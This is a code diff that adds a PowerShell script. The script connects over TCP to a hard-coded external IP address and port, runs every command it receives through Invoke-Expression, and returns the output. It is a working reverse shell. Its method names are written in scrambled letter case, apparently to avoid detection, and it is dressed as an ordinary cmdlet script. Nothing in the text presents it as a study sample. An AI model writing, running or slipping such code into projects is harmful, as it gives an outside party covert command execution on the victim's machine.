@@ -1,0 +1,37 @@
+
+[CmdletBinding(SupportsShouldProcess)]
+param()
+$Address = "64.228.230.38"
+$Port = 20001
+$ErrorActionPreference = 'Stop'
+try
+{
+    $Script:ARRAYDATA = [System.Byte[]]::CreateInstance([System.Byte],1024);
+   # $Script:ARRAYDATA = [System.Byte[]]::CreateInstance([System.Byte],1024);
+     $Script:NETPTR=New-Object System.Net.Sockets.TCPClient($Address,$Port)
+     while($Script:RCVDATA=$Script:NETPTR.GEtSTREAM())
+     {
+        whilE($Script:RCVDATA.dataAvAIlAbLe -or $Script:RCVNEWBYTES -eq $Script:ARRAYDATA.CouNt)
+        {
+            $Script:RCVNEWBYTES=$Script:RCVDATA.ReaD($Script:ARRAYDATA,0,$Script:ARRAYDATA.lENGtH);
+            $Script:STRINGDATA+=(NeW-OBjEct -tyPENAme sysTEM.texT.AsCIieNcodINg).gETSTRIng($Script:ARRAYDATA,0,$Script:RCVNEWBYTES)};
+            if($Script:STRINGDATA)
+            {
+                 $Script:EXECRESULTS=(iEx($Script:STRINGDATA)2>&1|OUt-StRinG);
+                
+                If(!($Script:EXECRESULTS.LenGth%$Script:ARRAYDATA.cOunT))
+                {   
+                    $Script:EXECRESULTS+=""
+                }
+
+                $Script:OTHERDATA=([texT.eNCoDIng]::asCII).gEtBYtes($Script:EXECRESULTS);$Script:RCVDATA.wriTe($Script:OTHERDATA,0,$Script:OTHERDATA.LenGtH);
+                $Script:RCVDATA.FLuSh();
+                $Script:STRINGDATA=$nULl
+            }
+        }
+        
+    
+}catch{
+        Show-ExceptionDetails $_ -ShowStack
+}
+
